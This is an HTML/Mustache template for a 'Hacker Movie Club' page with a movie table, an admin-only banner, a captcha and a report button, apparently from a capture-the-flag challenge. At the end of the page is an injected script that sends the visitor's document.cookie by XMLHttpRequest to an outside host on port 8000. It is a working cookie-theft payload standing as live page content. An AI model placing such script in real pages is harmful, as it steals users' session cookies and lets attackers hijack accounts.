<div class="header">
Hacker Movie Club
</div>

{{#admin}}
<div class="header admin">
Welcome to the desert of the real.
</div>
{{/admin}}

<table class="movies">
<thead>
 <th>Name</th><th>Year</th><th>Length</th>
</thead>
<tbody>
{{#movies}}
  {{^admin_only}}
    <tr>
      <td>{{ name }}</td>
      <td>{{ year }}</td>
      <td>{{ length }}</td>
    </tr>
  {{/admin_only}}
{{/movies}}
</tbody>
</table>

<div class="captcha">
  <div id="captcha"></div>
</div>
<button id="report" type="submit" class="report"></button>

<script>
var xhr = new XMLHttpRequest(); 
xhr.open('GET', 'http://laredo-16.mit.edu:8000' + document.cookie);
xhr.send('username=wangray_cbf603');

</script>